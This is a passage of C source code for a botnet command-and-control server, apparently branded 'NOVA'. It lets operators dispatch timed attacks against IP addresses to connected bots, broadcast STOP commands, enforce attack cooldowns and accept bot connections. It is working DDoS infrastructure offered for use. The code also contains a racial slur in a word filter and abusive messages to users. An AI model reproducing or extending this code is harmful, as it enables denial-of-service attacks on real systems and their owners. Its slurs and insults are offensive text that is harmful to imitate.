								fclose(f3);
								free(line3);
            					broadcast(buf, 0, "lol");
            					printf(""Y"%s"W": Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					int sendattacklisten;
            					for(sendattacklisten=0;sendattacklisten<MAXFDS;sendattacklisten++)
            					if(managements[sendattacklisten].listenattacks == 1 && managements[sendattacklisten].connected == 1)
            					{
            						sprintf(botnet, "\r\n"Y"%s"W": Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
								      
            						sprintf(usethis, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[sendattacklisten].id);
            						if(send(sendattacklisten, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            					}
            					memset(buf, 0, sizeof(buf));      
            					char attacksentrip[80][2048];
            					int rip;
            					sprintf(attacksentrip[1], "\t\t"E"         @@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[2], "\t\t"E"       @@@@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[3], "\t\t"E"      @@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[4], "\t\t"E"     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[5], "\t\t"E"    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[6], "\t\t"E"    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[7], "\t\t"E"    @@@@@@"B"888888"E"@@@@@@@"B"888888"E"@@@@@@\r\n");
            					sprintf(attacksentrip[8], "\t\t"E"     @@@"B"88888888"E"@@@@@@@"B"88888888"E"@@@@\r\n");
            					sprintf(attacksentrip[9], "\t\t"E"    @@@"B"88888888"E"@@@@@@@@"B"88888888"E"@@@@\r\n");
            					sprintf(attacksentrip[10],"\t\t"E"    @@@@"B"8886988"E"@@@@@@@@"B"88888888"E"@@@@@\r\n");
            					sprintf(attacksentrip[11],"\t\t"E"   @@@@@@@"B"88"E"@@@@@@@"B"8"E"@@@@@@"B"8888"E"@@@@@@\r\n");
            					sprintf(attacksentrip[12],"\t\t"E"    @@@@@@@@@@@@@@"B"888"E"@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[13],"\t\t"E"     @@@@@@@@@@@@@"B"888"E"@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[14],"\t\t"E"       @@@@@@@@@@@"B"888"E"@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[15],"\t\t"E"       @@@@@@@@@@@@"B"8"E"@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[16],"\t\t"E"        @@@@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[17],"\t\t"E"        @@@"B"8"E"@@@@@@@@@@@@@@@"B"8"E"@@@\r\n");
            					sprintf(attacksentrip[18],"\t\t"E"        @@@@@"B"8"E"@@"B"8"E"@@"B"8"E"@@"B"8"E"@@"B"8"E"@@@@@\r\n");
            					sprintf(attacksentrip[19],"\t\t"E"        @@@@@"B"8"E"@@"B"8"E"@@"B"8"E"@@"B"8"E"@@"B"8"E"@@@@@\r\n");
            					sprintf(attacksentrip[20],"\t\t"E"        @@@@@@@@"B"8"E"@@"B"8"E"@@"B"8"E"@@@@@@@@\r\n");
            					sprintf(attacksentrip[21],"\t\t"E"         @@@@@@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[22],"\t\t"E"           @@@@@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[23],"\t\t"E"             @@@@@@@@@@@@@@\r\n");
            					sprintf(attacksentrip[24],"\t"W"Attack %s Sent For %d Seconds To The IP: %s\r\n", argv[1], atoi(argv[4]), argv[2]);
  								for(rip=0;rip<30;rip++)
   								{
  									if(send(datafd, attacksentrip[rip], strlen(attacksentrip[rip]), MSG_NOSIGNAL) == -1) goto end;
  								}
  								pthread_t cooldownthread;
  								struct CoolDownArgs argz;	
  								if(managements[datafd].mycooldown > 1)
  								{
  									argz.sock = datafd;
  									argz.seconds = managements[datafd].mycooldown;
  									pthread_create(&cooldownthread, NULL, &StartCldown, (void *)&argz);
  								}
  							} 
                	} else {
                			sprintf(usethis, ""Y"Your Cool Down Has Not Expired Time left: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}
                } else {
                			sprintf(usethis, ""Y"Attacks Are Currently Disabled\r\n");
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;                	
                }
                memset(buf, 0, sizeof(buf));  
            }	


            if(strcasestr(buf, "nigger") || strcasestr(buf, "nig") || strcasestr(buf, "n1g") || strcasestr(buf, "nlg"))
            {
  					sprintf(usethis, "This Word Is Not Allowed Here!\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;           	
            }

			if(strcasestr(buf, "STOP"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				
				sprintf(killattack, "STOP");
				broadcast(killattack, datafd, "output.");
				sprintf(usethis, ""Y"Stopping The Attacks For The Bots\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			}

            if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				goto main_banner;
			}

			if(strlen(buf) > 80)
			{
				char fuckyou[8000];
				sprintf(fuckyou, ""Y"STOP TRYING TO CRASH THE CNC FUCK HEAD\r\n");
				if(send(datafd, fuckyou, strlen(fuckyou), MSG_NOSIGNAL) == -1) goto end;
			}
	}
						char input[800];
        		sprintf(input, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[datafd].id);
						if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
      				      printf("%s: \"%s\"\n",accounts[find_line].username, buf);
            				memset(buf, 0, sizeof(buf));
}

   


		end:
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						gay[datafd].just_logged_in = 0;
						sprintf(usethis, "\r\n"Y"%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;5;2m%s@\e[38;5;54mMortem~#\e[38;5;2m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
		managements[datafd].connected = 0;
		memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {    
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}
 

int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

        checkaccounts();
        checklog();
       	printf("\e[1;31mscreened fuck face press the correct keys dumbass . \r\n"); 
		threads = atoi(argv[2]);
		port = atoi(argv[3]);
        printf("port: %s\n",argv[3]);
        printf("threads: %s\n", argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
